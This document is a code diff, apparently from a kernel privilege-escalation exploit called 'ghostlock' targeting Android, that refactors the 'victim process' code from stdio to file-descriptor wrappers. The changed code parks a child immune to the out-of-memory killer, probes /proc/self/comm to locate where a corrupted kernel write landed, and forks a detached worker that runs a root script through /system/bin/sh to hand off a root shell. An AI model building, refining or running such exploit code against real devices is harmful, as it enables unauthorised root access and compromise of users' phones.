@@ -7,6 +7,9 @@
 #include "session/victim_process.hpp"
 
 #include "exploit_ops.hpp"
+#include "support/native_resource.hpp"
+
+#include <array>
 
 namespace ghostlock::victim {
 
@@ -16,10 +19,10 @@ namespace ghostlock::victim {
  * Input: VictimContext policy; output: non-returning parked state. Future:
  * victim_park_rooted_child(const VictimContext *). */
 static void park_child_process_forever(void) {
-    FILE *f = fopen("/proc/self/oom_score_adj", "w");
-    if (f) {
-        fputs("-1000", f);
-        fclose(f);
+    UniqueFd adj(open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC));
+    if (adj.valid()) {
+        const char value[] = "-1000";
+        (void) write(adj.get(), value, sizeof(value) - 1);
     }
     for (;;) pause();
 }
@@ -91,14 +94,13 @@ static void child_main(VictimContext *p) {
             /* Report comm length + first byte to tell which side a leaf=1 write
              * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
              * [target+8] len 8, untouched len 15. */
-            char comm[24] = {0};
-            FILE *cf = fopen("/proc/self/comm", "r");
-            if (cf) {
-                size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
+            std::array<char, 24> comm{};
+            UniqueFd cf(open("/proc/self/comm", O_RDONLY | O_CLOEXEC));
+            if (cf.valid()) {
+                const ssize_t n = read(cf.get(), comm.data(), comm.size() - 1);
                 (void) n;
-                fclose(cf);
             }
-            size_t len = strlen(comm);
+            size_t len = strlen(comm.data());
             while (len > 0 && comm[len - 1] == '\n') {
                 comm[len - 1] = 0;
                 len--;
@@ -132,8 +134,9 @@ static void child_main(VictimContext *p) {
      * is now std::string-owned; passing its heap pointer straight into execl()
      * failed with EFAULT at the kernel boundary even though userspace could
      * print it, so the exec path must travel in process-stable stack storage. */
-    char script_path[320];
-    snprintf(script_path, sizeof(script_path), "%s", (runtime_config_snapshot().root_script_path.c_str()));
+    std::array<char, 320> script_path{};
+    snprintf(script_path.data(), script_path.size(), "%s",
+            runtime_config_snapshot().root_script_path.c_str());
     pid_t worker = fork();
     if (worker == 0) {
         /* Detach into a brand-new session: the independent root shell owns the
@@ -141,13 +144,14 @@ static void child_main(VictimContext *p) {
          * exploit parent killing this group on timeout. */
         if (setsid() < 0) _exit(1);
         errno = 0;
-        const int probe = open(script_path, O_RDONLY | O_CLOEXEC);
+        const int probe = open(script_path.data(), O_RDONLY | O_CLOEXEC);
         pr_info("handoff: script open fd=%d errno=%d path=%s\n", probe, errno,
-                script_path);
+                script_path.data());
         if (probe >= 0) close(probe);
-        execl("/system/bin/sh", "sh", script_path, static_cast<char *>(nullptr));
+        execl("/system/bin/sh", "sh", script_path.data(),
+                static_cast<char *>(nullptr));
         pr_warning("execl root script failed path=%s errno=%d\n",
-                script_path, errno);
+                script_path.data(), errno);
         _exit(1);
     }
     pr_info("handoff: root shell worker pid=%d\n", worker);
